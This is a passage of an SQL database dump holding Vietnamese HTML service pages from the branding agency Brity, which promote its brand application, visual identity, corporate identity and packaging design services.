kh&aacute;ch h&agrave;ng, trực tiếp hướng tới nhu cầu của kh&aacute;ch h&agrave;ng nhằm đảm bảo x&acirc;y dựng thương hiệu to&agrave;n vẹn, g&oacute;p phần tạo n&ecirc;n bước đệm ph&aacute;t triển cho kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><img src=\"http://brity.vn/upload/8_1.jpg\" alt=\"\" width=\"1161\" height=\"595\" /></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Tại Brity lu&ocirc;n hoạt động với nguy&ecirc;n tắc kh&ocirc;ng mang tới mức chi ph&iacute; rẻ nhất, nhưng đảm bảo mang tới sản phẩm tốt nhất v&agrave; xứng đ&aacute;ng gi&aacute; trị với chi ph&iacute; kh&aacute;ch h&agrave;ng bỏ ra nhất, mang tới những thương hiệu ho&agrave;n hảo đảm bảo sự h&agrave;i l&ograve;ng của kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">&nbsp;</span></p>', NULL, 1, 0, 56, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 2, '2018-07-12 03:57:29', '', '2018-07-11 20:57:29'),
(61, 'Ứng dụng thương hiệu', 'Brand Applications', 'ung-dung-thuong-hieu', 'brand-applications', '', '<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bất cứ doanh nghiệp n&agrave;o khi hoạt động nếu muốn n&acirc;ng cao h&igrave;nh ảnh của doanh nghiệp v&agrave; c&oacute; kế hoạch quảng b&aacute; rộng r&atilde;i th&igrave; việc thiết kế những ứng dụng thương hiệu l&agrave; kh&ocirc;ng thể thiếu. Đặc biệt <strong><em><u>ứng dụng thương hiệu</u></em></strong> doanh nghiệp hấp dẫn, bắt mắt c&agrave;ng tăng cường hiệu quả marketing cho doanh nghiệp nhanh ch&oacute;ng v&agrave; phổ biến hơn.</span></p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><strong>1. Những ứng dụng thương hiệu cho doanh nghiệp</strong></span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Thiết kế ứng dụng thương hiệu doanh nghiệp l&agrave; thiết kế to&agrave;n bộ nhữn vật dụng sử dụng cho doanh nghiệp trong đ&oacute; bao gồm :</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Ứng dụng văn ph&ograve;ng : Bao gồm những vật dụng văn ph&ograve;ng trong doanh nghiệp như phong b&igrave; thư, danh thiếp, h&oacute;a đơn, giấy mời, đồng phục, thẻ nh&acirc;n vi&ecirc;n, biển ph&ograve;ng ban&hellip;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Ứng dụng truyền th&ocirc;ng : Bao gồm to&agrave;n bộ hồ sơ năng lực doanh nghiệp, biển quảng c&aacute;o, poster, banner, website, c&aacute;c vật dụng c&aacute; nh&acirc;n kh&aacute;c..</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Ứng dụng sản xuất v&agrave; nhận biết thương hiệu : Gồm c&aacute;c nh&atilde;n m&aacute;c, bao b&igrave; sản phẩm</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Ứng dụng biển quảng c&aacute;o&hellip;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Những vật dụng tr&ecirc;n đều l&agrave; những ứng dụng thương hiệu m&agrave; bất cứ doanh nghiệp n&agrave;o cũng cần thiết kế, đảm bảo tạo được điểm nhấn cũng như sự kh&aacute;c biệt cho doanh nghiệp của m&igrave;nh, tăng cường hiệu quả truyền b&aacute; h&igrave;nh ảnh doanh nghiệp tới người d&ugrave;ng v&agrave; kh&aacute;ch h&agrave;ng tốt nhất.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/02-branding-scene.jpg\" alt=\"\" width=\"1500\" height=\"1000\" /></span></p>\r\n<h2 style=\"text-align: justify;\">&nbsp;</h2>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><strong>2. Thiết kế ứng dụng thương hiệu ở đ&acirc;u ?</strong></span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Với tầm quan trọng của ứng dụng thương hiệu, doanh nghiệp tốt nhất n&ecirc;n t&igrave;m tới những đơn vị chuy&ecirc;n thiết kế ứng dụng thương hiệu danh tiếng v&agrave; đảm bảo, từ đ&oacute; cam kết thiết kế ứng dụng thương hiệu độc đ&aacute;o v&agrave; th&iacute;ch hợp nhất cho doanh nghiệp của bạn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Tất nhi&ecirc;n khi thiết kế ứng dụng thương hiệu, doanh nghiệp cần ch&uacute; trọng nhiều tới phong c&aacute;ch thể hiện thương hiệu v&agrave; được ẩn chứa b&ecirc;n trong th&ocirc;ng qua t&iacute;nh c&aacute;ch, gi&aacute; trị v&agrave; đặc điểm của thương hiệu, từ đ&oacute; tạo ra một gi&aacute; trị bản sắc ri&ecirc;ng cho thương hiệu đ&oacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Để t&igrave;m kiếm một đơn vị chuy&ecirc;n thiết kế ứng dụng thương hiệu chuy&ecirc;n nghiệp v&agrave; hiệu quả, Brity được đ&aacute;nh gi&aacute; l&agrave; đơn vị h&agrave;ng đầu trong thiết kế, với đội ngũ thiết kế d&agrave;y dặn kinh nghiệm, t&iacute;nh s&aacute;ng tạo độc đ&aacute;o cũng như khả năng thiết kế nổi bật, đảm bảo mang tới cho doanh nghiệp của bạn những th&agrave;nh phẩm chất lượng nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Doanh nghiệp khi đầu tư thương hiệu h&igrave;nh ảnh đại diện cũng như ứng dụng thương hiệu đầy đủ lu&ocirc;n đảm bảo tạo được hiệu quả t&agrave;i ch&iacute;nh cao hơn hẳn so với c&aacute;c doanh nghiệp c&oacute; những bộ ứng dụng thương hiệu đơn lẻ v&agrave; kh&ocirc;ng đầy đủ, đặc biệt l&agrave; trong m&ocirc;i trường cạnh tranh marketing ng&agrave;y c&agrave;ng khốc liệt hiện nay.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Để thiết kế ứng dụng thương hiệu mang phong c&aacute;ch ri&ecirc;ng ấn tượng v&agrave; độc đ&aacute;o cho doanh nghiệp của bạn, kh&aacute;ch h&agrave;ng c&oacute; thể t&igrave;m tới dịch vụ thiết kế ứng dụng thương hiệu tại Brity ch&uacute;ng t&ocirc;i. Tại đ&acirc;y ch&uacute;ng t&ocirc;i c&oacute; đầy đủ mọi chuy&ecirc;n gia trong lĩnh vực thiết kế v&agrave; x&acirc;y dựng thương hiệu, c&oacute; kinh nghiệm l&acirc;u năm trong lĩnh vực thiết kế quảng c&aacute;o, truyền th&ocirc;ng tiếp thị tại Việt Nam, đảm bảo mang tới cho kh&aacute;ch h&agrave;ng đ&uacute;ng điều m&agrave; bạn đang cần.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">&nbsp;<img src=\"http://brity.vn/upload/05-branding-scene.jpg\" alt=\"\" width=\"1000\" height=\"667\" /></span></p>', NULL, 1, 0, 56, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 3, '2018-07-12 04:08:57', '', '2018-07-11 21:08:57'),
(62, 'Hệ thống nhận diện thương hiệu trực quan', 'Visual Identity System', 'he-thong-nhan-dien-thuong-hieu-truc-quan', 'visual-identity-system', '', '<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">B&ocirc; Hệ thống nhận diện thương hiệu trực quan trực quan l&agrave; to&agrave;n bộ những yếu tố hữu h&igrave;nh của thương hiệu, trong đ&oacute; bao gồm bộ nhận diện văn ph&ograve;ng, slogan, logo&hellip;. Đ&acirc;y đều l&agrave; những yếu tố quan trọng gi&uacute;p ph&acirc;n biệt thương hiệu đễ d&agrave;ng hơn trong t&acirc;m tr&iacute; kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đặc biệt với kh&aacute;ch h&agrave;ng sử dụng dịch vụ thiết kế bộ Hệ thống nhận diện thương hiệu trực quan trực quan của Brity lu&ocirc;n đảm bảo bộ nhận diện thương hiệu trực quan của doanh nghiệp c&oacute; t&iacute;nh đồng bộ, nhất qu&aacute;n về h&igrave;nh ảnh, mang lại sự chuy&ecirc;n nghiệp cao nhất trong tầm nh&igrave;n của kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/03.jpg\" alt=\"\" width=\"1920\" height=\"1000\" /></span></p>\r\n<h2 style=\"text-align: justify;\">&nbsp;</h2>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">1. Tại sao n&ecirc;n thiết kế Hệ thống nhận diện thương hiệu trực quan trực quan tại Brity ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Thiết kế Hệ thống nhận diện thương hiệu trực quan trực quan tại Brity lu&ocirc;n cam kết mang tới cho kh&aacute;ch h&agrave;ng những th&agrave;nh phẩm ho&agrave;n hảo nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Sử dụng dịch vụ thiết kế Hệ thống nhận diện thương hiệu trực quan trực quan tại Brity kh&ocirc;ng chỉ tạo sự chuy&ecirc;n nghiệp cho doanh nghiệp m&agrave; c&ograve;n l&agrave;m n&ecirc;n h&igrave;nh ảnh của doanh nghiệp của bạn, từ đ&oacute; dễ d&agrave;ng thu h&uacute;t kh&aacute;ch h&agrave;ng v&agrave; gia tăng được sự tin tưởng của c&aacute;c nh&agrave; đầu tư, đối t&aacute;c cũng như kh&aacute;ch h&agrave;ng của bạn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Một bộ nhận diện thương hiệu trực quan tốt cũng gi&uacute;p người d&ugrave;ng dễ d&agrave;ng ghi nhớ thương hiệu hơn, từ đ&oacute; nhận định v&agrave; ph&acirc;n biệt được sự nổi bật trong ng&agrave;nh m&agrave; doanh nghiệp của bạn đang hoạt động, tạo dựng quy m&ocirc; cho c&ocirc;ng ty để thu h&uacute;t nh&agrave; đầu tư dễ d&agrave;ng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bộ Hệ thống nhận diện thương hiệu trực quan trực quan cũng gi&uacute;p x&aacute;c định lĩnh vực kinh doanh của bạn trong mắt người ti&ecirc;u d&ugrave;ng, đảm bảo đ&aacute;p ứng ti&ecirc;u chuẩn ng&agrave;nh v&agrave; ti&ecirc;u chuẩn kinh doanh tốt nhất.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">2. Bộ nhận diện thương hiệu trực quan trực quan bao gồm những g&igrave; ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bộ nhận diện thương hiệu trực quan đầy đủ của doanh nghiệp bao gồm nhiều mảng kh&aacute;c nhau, trong đ&oacute; c&oacute; bộ nhận diện cốt l&otilde;i như slogan, logo, brand name hoặc Brand guidelines.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Ngo&agrave;i ra c&ograve;n c&oacute; bộ nhận diện văn ph&ograve;ng : h&oacute;a đơn, danh thiếp, đồng phục&hellip;..</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">C&aacute;c ấn phẩm marketing như catalogue, Profile c&ocirc;ng ty, Brochure dự &aacute;n, Flyer / Leaflet, Sales kit.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bộ nhận diện thương hiệu trực quan c&ograve;n c&oacute; nhận diện sản phẩm như bao b&igrave;, nh&atilde;n m&aacute;c&hellip; hay bộ nhận diện internet gồm Website c&ocirc;ng ty, Landing page, Facebook Fanpage, Banner ads, Email marketing&hellip;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Ngo&agrave;i ra c&ograve;n nhiều mảng kh&aacute;c trong bộ nhận diện thương hiệu trực quan t&ugrave;y theo từng quy m&ocirc; v&agrave; hoạt động của doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/05.jpg\" alt=\"\" width=\"1920\" height=\"1000\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">3. Thiết kế bộ nhận diện thương hiệu trực quan tại Brity</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Nếu bạn đang t&igrave;m kiếm một bộ nhận diện thương hiệu trực quan ho&agrave;n hảo c&oacute; thể t&igrave;m tới Brity l&agrave;m đơn vị thiết kế nhận diện thương hiệu trực quan s&aacute;ng tạo v&agrave; chất lượng cho doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">L&agrave; một đơn vị c&oacute; chuy&ecirc;n m&ocirc;n cao trong thiết kế nhận diện thương hiệu trực quan, Brity sở hữu đội&nbsp; ngũ thiết kế chuy&ecirc;n nghiệp, s&aacute;ng tạo gi&uacute;p thể hiện được t&iacute;nh c&aacute;ch, gi&aacute; trị v&agrave; đặc điểm của thương hiệu, từ đ&oacute; tạo ra một gi&aacute; trị bản sắc ri&ecirc;ng cho thương hiệu đ&oacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Để thiết kế ứng dụng thương hiệu mang phong c&aacute;ch ri&ecirc;ng ấn tượng v&agrave; độc đ&aacute;o cho doanh nghiệp của bạn, kh&aacute;ch h&agrave;ng c&oacute; thể t&igrave;m tới dịch vụ thiết kế ứng dụng thương hiệu tại Brity ch&uacute;ng t&ocirc;i. Tại đ&acirc;y ch&uacute;ng t&ocirc;i c&oacute; đầy đủ mọi chuy&ecirc;n gia trong lĩnh vực thiết kế v&agrave; x&acirc;y dựng thương hiệu, c&oacute; kinh nghiệm l&acirc;u năm trong lĩnh vực thiết kế quảng c&aacute;o, truyền th&ocirc;ng tiếp thị tại Việt Nam, đảm bảo mang tới cho kh&aacute;ch h&agrave;ng đ&uacute;ng điều m&agrave; bạn đang cần.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">&nbsp;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/06.jpg\" alt=\"\" width=\"1500\" height=\"1000\" /></span></p>', NULL, 1, 0, 56, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 7, '2018-07-12 04:53:04', '', '2018-07-11 21:53:04'),
(63, 'Nhận diện thương hiệu doanh nghiệp', 'Corporate Brand Identity', 'nhan-dien-thuong-hieu-doanh-nghiep', 'corporate-brand-identity', '', '<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">B&ocirc; nhận diện thương hiệu doanh nghiệp l&agrave; to&agrave;n bộ những yếu tố hữu h&igrave;nh của thương hiệu, trong đ&oacute; bao gồm bộ nhận diện văn ph&ograve;ng, slogan, logo&hellip;. Đ&acirc;y đều l&agrave; những yếu tố quan trọng gi&uacute;p ph&acirc;n biệt thương hiệu đễ d&agrave;ng hơn trong t&acirc;m tr&iacute; kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đặc biệt với kh&aacute;ch h&agrave;ng sử dụng dịch vụ thiết kế bộ nhận diện thương hiệu doanh nghiệp của Brity lu&ocirc;n đảm bảo bộ nhận diện thương hiệu của doanh nghiệp c&oacute; t&iacute;nh đồng bộ, nhất qu&aacute;n về h&igrave;nh ảnh, mang lại sự chuy&ecirc;n nghiệp cao nhất trong tầm nh&igrave;n của kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/Team%2008.jpg\" alt=\"\" width=\"1500\" height=\"764\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">1. Tại sao n&ecirc;n thiết kế nhận diện thương hiệu doanh nghiệp tại Brity ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Thiết kế nhận diện thương hiệu doanh nghiệp tại Brity lu&ocirc;n cam kết mang tới cho kh&aacute;ch h&agrave;ng những th&agrave;nh phẩm ho&agrave;n hảo nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Sử dụng dịch vụ thiết kế nhận diện thương hiệu doanh nghiệp tại Brity kh&ocirc;ng chỉ tạo sự chuy&ecirc;n nghiệp cho doanh nghiệp m&agrave; c&ograve;n l&agrave;m n&ecirc;n h&igrave;nh ảnh của doanh nghiệp của bạn, từ đ&oacute; dễ d&agrave;ng thu h&uacute;t kh&aacute;ch h&agrave;ng v&agrave; gia tăng được sự tin tưởng của c&aacute;c nh&agrave; đầu tư, đối t&aacute;c cũng như kh&aacute;ch h&agrave;ng của bạn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Một bộ nhận diện thương hiệu tốt cũng gi&uacute;p người d&ugrave;ng dễ d&agrave;ng ghi nhớ thương hiệu hơn, từ đ&oacute; nhận định v&agrave; ph&acirc;n biệt được sự nổi bật trong ng&agrave;nh m&agrave; doanh nghiệp của bạn đang hoạt động, tạo dựng quy m&ocirc; cho c&ocirc;ng ty để thu h&uacute;t nh&agrave; đầu tư dễ d&agrave;ng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bộ nhận diện thương hiệu doanh nghiệp cũng gi&uacute;p x&aacute;c định lĩnh vực kinh doanh của bạn trong mắt người ti&ecirc;u d&ugrave;ng, đảm bảo đ&aacute;p ứng ti&ecirc;u chuẩn ng&agrave;nh v&agrave; ti&ecirc;u chuẩn kinh doanh tốt nhất.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">2. Bộ nhận diện thương hiệu bao gồm những g&igrave; ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bộ nhận diện thương hiệu đầy đủ của doanh nghiệp bao gồm nhiều mảng kh&aacute;c nhau, trong đ&oacute; c&oacute; bộ nhận diện cốt l&otilde;i như slogan, logo, brand name hoặc Brand guidelines.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Ngo&agrave;i ra c&ograve;n c&oacute; bộ nhận diện văn ph&ograve;ng : h&oacute;a đơn, danh thiếp, đồng phục&hellip;..</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">C&aacute;c ấn phẩm marketing như catalogue, Profile c&ocirc;ng ty, Brochure dự &aacute;n, Flyer / Leaflet, Sales kit.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bộ nhận diện thương hiệu c&ograve;n c&oacute; nhận diện sản phẩm như bao b&igrave;, nh&atilde;n m&aacute;c&hellip; hay bộ nhận diện internet gồm Website c&ocirc;ng ty, Landing page, Facebook Fanpage, Banner ads, Email marketing&hellip;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Ngo&agrave;i ra c&ograve;n nhiều mảng kh&aacute;c trong bộ nhận diện thương hiệu t&ugrave;y theo từng quy m&ocirc; v&agrave; hoạt động của doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/07.jpg\" alt=\"\" width=\"1500\" height=\"1000\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">3. Thiết kế bộ nhận diện thương hiệu tại Brity</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Nếu bạn đang t&igrave;m kiếm một bộ nhận diện thương hiệu ho&agrave;n hảo c&oacute; thể t&igrave;m tới Brity l&agrave;m đơn vị thiết kế nhận diện thương hiệu s&aacute;ng tạo v&agrave; chất lượng cho doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">L&agrave; một đơn vị c&oacute; chuy&ecirc;n m&ocirc;n cao trong thiết kế nhận diện thương hiệu, Brity sở hữu đội&nbsp; ngũ thiết kế chuy&ecirc;n nghiệp, s&aacute;ng tạo gi&uacute;p thể hiện được t&iacute;nh c&aacute;ch, gi&aacute; trị v&agrave; đặc điểm của thương hiệu, từ đ&oacute; tạo ra một gi&aacute; trị bản sắc ri&ecirc;ng cho thương hiệu đ&oacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Để thiết kế ứng dụng thương hiệu mang phong c&aacute;ch ri&ecirc;ng ấn tượng v&agrave; độc đ&aacute;o cho doanh nghiệp của bạn, kh&aacute;ch h&agrave;ng c&oacute; thể t&igrave;m tới dịch vụ thiết kế ứng dụng thương hiệu tại Brity ch&uacute;ng t&ocirc;i. Tại đ&acirc;y ch&uacute;ng t&ocirc;i c&oacute; đầy đủ mọi chuy&ecirc;n gia trong lĩnh vực thiết kế v&agrave; x&acirc;y dựng thương hiệu, c&oacute; kinh nghiệm l&acirc;u năm trong lĩnh vực thiết kế quảng c&aacute;o, truyền th&ocirc;ng tiếp thị tại Việt Nam, đảm bảo mang tới cho kh&aacute;ch h&agrave;ng đ&uacute;ng điều m&agrave; bạn đang cần.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/08.jpg\" alt=\"\" width=\"1462\" height=\"848\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">&nbsp;</span></p>', NULL, 1, 0, 56, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 8, '2018-07-12 07:03:24', '', '2018-07-12 00:03:24'),
(64, 'Thiết kế bao bì & Nhãn sản phẩm', 'Packaging & Label Design', 'thiet-ke-bao-bi-nhan-san-pham', 'packaging-label-design', '', '<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đối với thương hiệu mới nếu muốn <strong><em><u>thiết kế bao b&igrave; v&agrave; nh&atilde;n sản phẩm</u></em></strong> cần ch&uacute; &yacute; quan t&acirc;m nhiều hơn tới ấn tượng của kh&aacute;ch h&agrave;ng đối với bao b&igrave; của bạn, đặc biệt với bao b&igrave; c&oacute; ấn tượng tốt từ kh&aacute;ch h&agrave;ng sẽ gi&uacute;p gia tăng độ phủ s&oacute;ng của thương hiệu, tạo thiện cảm tốt với người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Dưới đ&acirc;y l&agrave; những ti&ecirc;u ch&iacute; của Brity khi thiết kế bao b&igrave; v&agrave; nh&atilde;n sản phẩm cho thương hiệu mới m&agrave; bạn c&oacute; thể t&igrave;m hiểu.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">1. Đảm bảo mọi chức năng của bao b&igrave; v&agrave; nh&atilde;n sản phẩm</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Một trong những ch&uacute; &yacute; quan trọng khi thiết kế bao b&igrave; v&agrave; nh&atilde;n sản phẩm cho thương hiệu l&agrave; phải cam kết bao b&igrave; đảm bảo đầy đủ chức năng cần thiết.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bạn n&ecirc;n biết rằng một bao b&igrave; v&agrave; nh&atilde;n sản phẩm d&ugrave; c&oacute; độc đ&aacute;o, c&oacute; đẹp v&agrave; kh&aacute;c biệt th&igrave; cũng cần đảm bảo chức năng bảo vệ, bảo quản sản phẩm tốt, cam kết t&iacute;nh ứng dụng của sản phẩm, từ đ&oacute; gi&uacute;p tăng sự hấp dẫn của sản phẩm với kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/E2%20Kraf.jpg\" alt=\"\" width=\"2000\" height=\"882\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">2. Bao b&igrave; v&agrave; nh&atilde;n sản phẩm phải c&oacute; điểm nhấn</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Muốn thiết kế bao b&igrave; v&agrave; nh&atilde;n sản phẩm cho thương hiệu mới cần ch&uacute; &yacute; tạo điểm nhấn ấn tượng cho thiết kế, từ đ&oacute; gi&uacute;p kh&aacute;ch ghi nhớ v&agrave; ch&uacute; &yacute; tới sản phẩm nhiều hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đ&acirc;y cũng l&agrave; l&yacute; do khi thiết kế bao b&igrave; v&agrave; nh&atilde;n sản phẩm cho sản phẩm mới, việc tạo điểm nhấn ấn tượng l&agrave; cần thiết, đảm bảo t&iacute;nh độc đ&aacute;o v&agrave; g&acirc;y ấn tượng mạnh cho người d&ugrave;ng.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">3. Lựa chọn kiểu chữ c&ugrave;ng m&agrave;u sắc cẩn thận</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Kiểu chữ c&ugrave;ng m&agrave;u sắc của bao b&igrave; v&agrave; nh&atilde;n sản phẩm cũng l&agrave; ti&ecirc;u ch&iacute; quan trọng người d&ugrave;ng cần ch&uacute; &yacute; khi thiết kế, đ&acirc;y l&agrave; 2 yếu tố đặc biệt quan trọng c&oacute; thể ảnh hưởng kh&ocirc;ng nhỏ tới th&agrave;nh c&ocirc;ng của bao b&igrave; sản phẩm.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Một bao b&igrave; sản v&agrave; nh&atilde;n sản phẩm chất lượng phải đảm bảo m&agrave;u sắc ph&ugrave; hợp với sản phẩm b&ecirc;n trong bao b&igrave;, thể hiện t&iacute;nh chất sản phẩm cũng như c&aacute; t&iacute;nh của doanh nghiệp.</span></p>\r\n<p 